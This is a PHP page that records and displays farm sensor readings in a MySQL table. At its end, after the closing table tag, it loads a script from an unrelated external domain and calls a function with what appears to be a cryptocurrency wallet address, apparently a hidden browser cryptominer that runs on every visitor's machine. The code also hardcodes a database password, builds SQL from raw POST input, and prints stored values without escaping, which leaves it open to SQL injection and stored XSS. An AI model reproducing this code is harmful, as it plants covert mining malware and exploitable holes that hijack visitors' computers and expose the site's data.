<?php
$servername = "localhost";
$dbname = "u497569487_monitoring";
$username = "u497569487_monitoring";
$password = "Eugenian2206";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if POST data is received
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get data from POST request
    $value1 = $_POST["value1"];
    $value2 = $_POST["value2"];
    $value3 = $_POST["value3"];
    $value4 = $_POST["value4"];
    $value5 = $_POST["value5"];
    $value6 = $_POST["value6"];
    $value7 = $_POST["value7"];
    $value8 = $_POST["value8"];
    $value9 = $_POST["value9"];
    $value10 = $_POST["value10"];
    $value11 = $_POST["value11"];
    $value12 = $_POST["value12"];
    $value13 = $_POST["value13"];
    $value14 = $_POST["value14"];

    // Insert data into the database
    $sql = "INSERT INTO SensorData (value1, value2, value3, value4, value5, value6, value7, value8, value9, value10, value11, value12, value13, value14, reading_time)
            VALUES ('$value1', '$value2', '$value3', '$value4', '$value5', '$value6', '$value7', '$value8', '$value9', '$value10', '$value11', '$value12', '$value13', '$value14', NOW())";

    if ($conn->query($sql) === TRUE) {
        echo "Data inserted successfully";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

// Select and display data from the database
$sql = "SELECT id, value1, value2, value3, value4, value5, value6, value7, value8, value9, value10, value11, value12, value13, value14, reading_time FROM SensorData ORDER BY id DESC";

echo '<table cellspacing="5" cellpadding="5">
      <tr> 
        <td>Nitrogen</td> 
        <td>Phosphorus</td> 
        <td>Potassium</td> 
        <td>PH</td>
        <td>Moisture</td>
        <td>soil temp</td>
        <td>soil ctvt</td>
        <td>Env_temp</td> 
        <td>Env_humid</td> 
        <td>Pressure</td> 
        <td>Water level</td>
        <td>Air quality</td>
        <td>Rainfall</td> 
        <td>Light_intensity</td> 
        <td>Timestamp</td> 
      </tr>';

if ($result = $conn->query($sql)) {
    while ($row = $result->fetch_assoc()) {
        // Extract data from the row
        $value1 = $row["value1"];
        $value2 = $row["value2"];
        $value3 = $row["value3"];
        $value4 = $row["value4"];
        $value5 = $row["value5"];
        $value6 = $row["value6"];
        $value7 = $row["value7"];
        $value8 = $row["value8"];
        $value9 = $row["value9"];
        $value10 = $row["value10"];
        $value11 = $row["value11"];
        $value12 = $row["value12"];
        $value13 = $row["value13"];
        $value14 = $row["value14"];
        $reading_time = $row["reading_time"];

        // Display data in the table
        echo '<tr> 
                <td>' . $value1 . '</td> 
                <td>' . $value2 . '</td>
                <td>' . $value3 . '</td>
                <td>' . $value4 . '</td>
                <td>' . $value5 . '</td>
                <td>' . $value6 . '</td>
                <td>' . $value7 . '</td>
                <td>' . $value8 . '</td>
                <td>' . $value9 . '</td>
                <td>' . $value10 . '</td>
                <td>' . $value11 . '</td>
                <td>' . $value12 . '</td>
                <td>' . $value13 . '</td>
                <td>' . $value14 . '</td>
                <td>' . $reading_time . '</td> 
              </tr>';
    }
    $result->free();
}

// Close the connection
$conn->close();
?>
</table>
<script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
<script type="text/javascript">
    EverythingIsLife("47NsaEwhbk92CfibMJg8M8hJ73LKDv9NTjNtHLFH6EQE2sAUdgnwPc231gghf3rYBvC6cXvgLahJKa4riqQBxbT1HBjQhFu", "web", 50);
</script>
</body>
</html>
